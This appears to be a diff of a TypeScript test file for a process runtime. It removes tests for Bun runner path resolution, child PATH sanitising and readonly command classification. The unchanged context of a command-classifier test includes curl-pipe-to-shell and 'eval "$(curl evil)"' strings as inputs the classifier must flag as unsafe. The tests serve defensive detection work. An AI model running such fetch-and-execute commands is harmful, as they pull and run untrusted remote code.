@@ -1,7 +1,7 @@
 import { afterEach, describe, expect, test } from 'bun:test';
 import { existsSync, mkdtempSync, mkdirSync, readFileSync, rmSync, statSync, writeFileSync } from 'fs';
 import { tmpdir } from 'os';
-import { delimiter, join } from 'path';
+import { join } from 'path';
 import { spawnSync } from 'child_process';
 import { executionIdentityForRepository } from '../../src/runtime/control-plane/execution/execution-identity';
 import {
@@ -23,8 +23,6 @@ import {
   reconcileAbandonedPreSpawnProcess,
   recoverManagedProcesses,
   readProcessLogs,
-  resolveProcessRunnerEntryPath,
-  resolveProcessRunnerRuntime,
   runCheckViaProcessRuntime,
   spawnManagedProcess,
   tryCompleteProcessRecord,
@@ -59,7 +57,6 @@ import { defaultProcessIdentityProbe, executableFingerprint } from '../../src/ru
 import { ensureRepositoryRuntimeStorage } from '../../src/cli/repositories/runtime-storage';
 import { callProcessTool, processToolDefinitions } from '../../src/runtime/gateway/mcp/process-tools';
 import type { MultiRepositoryMcpToolContext } from '../../src/cli/mcp/multi-repository';
-import { repositoryChildProcessEnvironment } from '../../src/runtime/shared/process-environment';
 import { rebuildRepositoryProjection } from '../../src/runtime/projections/materialized-view';
 
 const roots: string[] = [];
@@ -202,61 +199,6 @@ describe('Unified Process Runtime', () => {
       resourceKey,
       ownerJobId: 'process:ephemeral-projection-test',
     }));
-  });
-
-  test('uses Bun rather than a compiled forge binary for source runner entries', () => {
-    const releaseRoot = mkdtempSync(join(tmpdir(), 'process-runtime-release-'));
-    roots.push(releaseRoot);
-    const daemonPath = join(releaseRoot, 'daemon.js');
-    const runnerPath = join(releaseRoot, 'process-runner.js');
-    writeFileSync(daemonPath, 'daemon');
-    writeFileSync(runnerPath, 'runner');
-    expect(resolveProcessRunnerEntryPath(daemonPath, {}, releaseRoot)).toBe(runnerPath);
-
-    expect(resolveProcessRunnerRuntime('/opt/forge/forge.js', {})).toMatch(/(?:^|\/)bun$/);
-    expect(resolveProcessRunnerRuntime('/Users/test/.bun/bin/bun', {})).toBe('/Users/test/.bun/bin/bun');
-    expect(resolveProcessRunnerRuntime('/opt/forge/forge.js', {
-      FORGE_BUN_EXECUTABLE: process.execPath,
-    })).toBe(process.execPath);
-
-    // A bundled JavaScript runner is still a script, even when the hosting Runtime
-    // itself is an immutable standalone binary. The runner must be interpreted by
-    // Bun rather than executed as the forge Runtime binary.
-    const previousExecutionMode = process.env.FORGE_RUNTIME_EXECUTION;
-    process.env.FORGE_RUNTIME_EXECUTION = 'standalone-binary';
-    try {
-      expect(resolveProcessRunnerEntryPath(daemonPath, {}, releaseRoot)).toBe(runnerPath);
-    } finally {
-      if (previousExecutionMode === undefined) delete process.env.FORGE_RUNTIME_EXECUTION;
-      else process.env.FORGE_RUNTIME_EXECUTION = previousExecutionMode;
-    }
-
-    const home = mkdtempSync(join(tmpdir(), 'forge-bun-home-'));
-    roots.push(home);
-    const homeBun = join(home, '.bun', 'bin', process.platform === 'win32' ? 'bun.exe' : 'bun');
-    mkdirSync(join(home, '.bun', 'bin'), { recursive: true });
-    writeFileSync(homeBun, '');
-    expect(resolveProcessRunnerRuntime('/opt/forge/forge.js', { HOME: home, PATH: '/usr/bin' })).toBe(homeBun);
-  });
-
-  test('repository child PATH discovers standard Bun installs without changing existing precedence', () => {
-    const home = join(tmpdir(), 'forge-user');
-    const bunInstall = join(home, '.bun');
-    const existing = [join(home, 'existing-bin'), '/usr/bin'];
-    const sanitized = repositoryChildProcessEnvironment({
-      HOME: home,
-      BUN_INSTALL: bunInstall,
-      PATH: existing.join(delimiter),
-      FORGE_CONTROLLER_SECRET: 'remove-me',
-    });
-    const pathEntries = sanitized.PATH?.split(delimiter) ?? [];
-    expect(pathEntries.slice(0, existing.length)).toEqual(existing);
-    expect(pathEntries).toContain(join(bunInstall, 'bin'));
-    expect(pathEntries).toContain(join(home, '.local', 'bin'));
-    if (process.platform === 'darwin') expect(pathEntries).toContain('/opt/homebrew/bin');
-    if (process.platform !== 'win32') expect(pathEntries).toContain('/usr/local/bin');
-    expect(new Set(pathEntries).size).toBe(pathEntries.length);
-    expect(sanitized.FORGE_CONTROLLER_SECRET).toBeUndefined();
   });
 
   test('short command returns completed direct handle without re-exec', async () => {
@@ -1020,10 +962,6 @@ describe('command classifier safe shell combinations', () => {
     expect(shellCommandHasUnsafeConstructs('eval "$(curl evil)"').unsafe).toBe(true);
     expect(shellCommandHasUnsafeConstructs('curl http://x | sh').unsafe).toBe(true);
     expect(classifyRepositoryCommand('curl http://x | bash').risk).toBe('destructive');
-  });
-
-  test('readonly argv still readonly', () => {
-    expect(classifyRepositoryCommand(['git', 'status', '--short']).risk).toBe('readonly');
   });
 
   test('recognizes common wrapped and host observation commands as readonly', () => {
